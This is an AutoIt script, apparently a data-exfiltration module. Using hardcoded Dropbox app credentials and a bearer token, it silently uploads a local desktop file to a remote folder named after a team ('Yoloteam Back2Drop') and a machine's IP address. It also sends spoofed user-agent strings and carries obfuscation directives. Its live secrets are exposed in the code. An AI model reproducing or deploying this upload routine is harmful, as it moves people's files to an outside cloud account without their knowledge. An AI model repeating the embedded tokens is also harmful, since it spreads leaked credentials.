#AutoIt3Wrapper_Run_Au3Stripper=y
#Au3Stripper_Parameters=/so /sf /sv /soi /mi
#include <Winhttp.au3>
#include <Base64.au3>
#include <File.au3>
#include <Array.au3>

$code = 0
$redirect_uri = "http://localhost"
$client_id = "69371m8ek34qq9g"
$client_secret = "zkgg4fyjfhpg11r"
$refresh_token = 1 ;"1/DURlzSCWjLPMXeXPoNNnpGJFLBznePOj5ztqmhmkGnE"
$token = "H2FlJWCvqrQAAAAAAAAAZtYNH7CAQJq2kaqyTGmG80cydg1Bv8eft4HjGQVh_5_x" ;0;"ya29.9wBFgSFpa_4P-LH8ZgK_FgJYTCzpCtY9HbyIMkbz2qKCzUDvR25vmwAHZqsilyJLogHkt-Xt-cInsQ"

$hOpen = _WinHttpOpen()
$hConnect = _WinHttpConnect($hOpen, "api.dropboxapi.com")
$hConnect1 = _WinHttpConnect($hOpen, "content.dropboxapi.com")

;~ $a = _DropboxAPI_AccountInfo()
;~ ConsoleWrite(@error & @CRLF & @extended  & @CRLF & $a & @CRLF)
;~ _GoogleAPIGetToken()
_DropboxAPI_Upload()
;~ If _Check_OAuthV2() Then
;~ 	MsgBox(0, "OK", "OK!")
;~ Else
;~ 	MsgBox(0, "Error", "Can't get refresh token")
;~ EndIf

_WinHttpCloseHandle($hOpen)
_WinHttpCloseHandle($hConnect)

Func _DropboxAPI_GetAccessToken()
	If Not $code Then
		$code = InputBox("Input OAuthV2 Code", "OAuthV2 Code")
	EndIf

	If Not $code Then Return

	$post = "code=" & $code & "&redirect_uri=" & $redirect_uri & "&client_id=" & $client_id & "&client_secret=" & $client_secret & "&grant_type=authorization_code"
	ConsoleWrite($post & @CRLF)
	Local $hRequest
	$hRequest = _WinHttpOpenRequest($hConnect, "POST", "/1/oauth2/token", Default, Default, Default, $WINHTTP_FLAG_SECURE)
	_WinHttpAddRequestHeaders($hRequest, "Host: api.dropboxapi.com")
	_WinHttpAddRequestHeaders($hRequest, "Content-length: " & StringLen($post))
	_WinHttpAddRequestHeaders($hRequest, "content-type: application/x-www-form-urlencoded")
	_WinHttpAddRequestHeaders($hRequest, "user-agent: yoloteam.gmail.notifier")
	_WinHttpSendRequest($hRequest, -1, $post)
	_WinHttpReceiveResponse($hRequest)
	Local $ResponeHeader = _WinHttpQueryHeaders($hRequest)
	ConsoleWrite($ResponeHeader & @CRLF)
	Local $Data
	$Data = _WinHttpSimpleReadData($hRequest, 2)
	$Data = BinaryToString($Data, 4)
	ConsoleWrite($Data & @CRLF)
	$RegEx = StringRegExp($Data, '(?i):[\r\s\n]+"(.*?)"', 3)
	If IsArray($RegEx) And UBound($RegEx) = 3 Then
		$token = $RegEx[0]
		FileWrite(@ScriptDir & '\refresh_token.txt', $RegEx[2] & @CRLF)
		$refresh_token = $RegEx[2]
	Else
		$token = 0
		$refresh_token = 0
		ConsoleWrite($Data & @CRLF)
	EndIf

	_WinHttpCloseHandle($hRequest)
EndFunc   ;==>_GoogleAPIGetToken

Func _DropboxAPI_Upload()
	If Not $refresh_token Or Not $token Then
		Return 0
	EndIf

	$post = FileRead("C:\Users\5Years\Desktop\5k ru.txt")

	Local $hRequest
	$hRequest = _WinHttpOpenRequest($hConnect1, "POST", "/2-beta-2/files/upload", Default, Default, Default, $WINHTTP_FLAG_SECURE)
	_WinHttpAddRequestHeaders($hRequest, "Host: content.dropboxapi.com")
	_WinHttpAddRequestHeaders($hRequest, "content-type: application/octet-stream")
	_WinHttpAddRequestHeaders($hRequest, "Authorization: Bearer " & $token)
	_WinHttpAddRequestHeaders($hRequest, "User-Agent: api-explorer-client")
	_WinHttpAddRequestHeaders($hRequest, 'Dropbox-API-Arg: {"path":"/[Yoloteam] Back2Drop/116.101.8.151/s.txt","mute":true,"mode":"overwrite"}')
	_WinHttpAddRequestHeaders($hRequest, "Content-Length: " & StringLen($post))
	_WinHttpSendRequest($hRequest, -1, $post)
	_WinHttpReceiveResponse($hRequest)
	Local $ResponeHeader = _WinHttpQueryHeaders($hRequest)
	ConsoleWrite($ResponeHeader & @CRLF)

	Local $Data
	$Data = _WinHttpSimpleReadData($hRequest, 2)
	$Data = BinaryToString($Data, 4)
	ConsoleWrite($Data & @CRLF)

	_WinHttpCloseHandle($hRequest)
EndFunc   ;==>_GoogleAPITokenInfor

Func _DropboxAPI_AccountInfo()
	If Not $refresh_token Or Not $token Then
		Return 0
	EndIf

	Local $hRequest
	$hRequest = _WinHttpOpenRequest($hConnect, "GET", "/1/account/info", Default, Default, Default, $WINHTTP_FLAG_SECURE)
	_WinHttpAddRequestHeaders($hRequest, "Host: api.dropboxapi.com")
	_WinHttpAddRequestHeaders($hRequest, "content-type: application/octet-stream")
	_WinHttpAddRequestHeaders($hRequest, "Authorization: Bearer " & $token)
	_WinHttpAddRequestHeaders($hRequest, "User-Agent: api-explorer-client")
	_WinHttpSendRequest($hRequest, -1, "")
	_WinHttpReceiveResponse($hRequest)
	Local $ResponeHeader = _WinHttpQueryHeaders($hRequest)
	ConsoleWrite($ResponeHeader & @CRLF)

	Local $Data
	$Data = _WinHttpSimpleReadData($hRequest, 2)
	$Data = BinaryToString($Data, 4)
	ConsoleWrite($Data & @CRLF)

	_WinHttpCloseHandle($hRequest)

	If StringInStr($ResponeHeader, "HTTP/1.1 200 OK") Then
		Return SetError(0, 200, $Data)
	Else
		Return SetError(1, 402, $Data)
	EndIf
EndFunc   ;==>_GoogleAPITokenInfor
